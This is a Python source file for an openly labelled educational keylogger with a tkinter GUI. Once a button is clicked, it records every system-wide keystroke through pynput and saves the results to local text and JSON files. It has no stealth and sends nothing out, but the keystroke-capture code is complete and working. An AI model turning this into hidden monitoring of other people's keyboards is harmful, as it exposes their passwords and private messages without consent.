import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

# Create main window
root = tk.Tk()
root.geometry("350x250")
root.title("Keylogger Project")
root.config(bg="lightblue")

# List to store key events (Pressed, Held, Released)
key_list = []

# Boolean flag to track key state
x = False

# String to store all keystrokes in sequence
key_strokes = ""


# ---------------- FILE HANDLING FUNCTIONS ----------------

def update_text_file(key):
    """
    Writes the captured keystrokes into a text file (logs.txt).
    Each time this function is called, it overwrites the file with updated content.
    """
    with open('logs.txt','w+') as key_stroke:
        key_stroke.write(key)


def update_json_file(key_list):
    """
    Stores the list of key events (Pressed, Held, Released) into a JSON file.
    The data is converted into bytes before writing.
    """
    with open('logs.json','+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)


# ---------------- KEYBOARD EVENT FUNCTIONS ----------------

def on_press(key):
    """
    Triggered whenever a key is pressed.

    Logic:
    - If key is pressed for the first time → store as 'Pressed'
    - If key is being held down → store as 'Held'
    - Updates the JSON log file after each event
    """
    global x, key_list

    if x == False:
        key_list.append({'Pressed': f"{key}"})
        x = True

    if x == True:
        key_list.append({'Held': f"{key}"})

    update_json_file(key_list)


def on_release(key):
    """
    Triggered whenever a key is released.

    Logic:
    - Marks key as 'Released'
    - Resets the flag so next press is treated fresh
    - Appends key to keystroke string
    - Updates both JSON and text log files
    """
    global x, key_list, key_strokes

    if x == True:
        key_list.append({'Released': f"{key}"})

    if x == True:
        x = False

    update_json_file(key_list)

    # Add released key to continuous keystroke string
    key_strokes = key_strokes + str(key)

    # Save keystrokes to text file
    update_text_file(str(key_strokes))


# ---------------- MAIN BUTTON ACTION ----------------

def butnaction():
    """
    Starts the keylogger when the button is clicked.

    Working:
    - Prints status message in console
    - Starts keyboard listener
    - Continuously listens for key press and release events
    """
    print("[+] Running Keylogger Successfully!\n[!] Saving the key logs in 'logs.json'")

    # Listener keeps running and tracking keyboard activity
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


# ---------------- GUI DESIGN ----------------

# Title Label
title = Label(root, text="Keylogger", font=("Verdana", 16, "bold"), bg="lightblue")
title.pack(pady=20)

# Description Label
desc = Label(root, text="Click the button below to start logging keystrokes",
             font=("Arial", 10), bg="lightblue")
desc.pack(pady=10)

# Start Button
start_btn = Button(root,
                   text="Start Keylogger",
                   command=butnaction,
                   font=("Arial", 12, "bold"),
                   bg="navy",
                   fg="white",
                   padx=10,
                   pady=5)
start_btn.pack(pady=20)

# Footer Label
footer = Label(root, text="Logs will be saved in logs.json & logs.txt",
               font=("Arial", 8), bg="lightblue")
footer.pack(side="bottom", pady=10)

# Run the GUI loop
root.mainloop()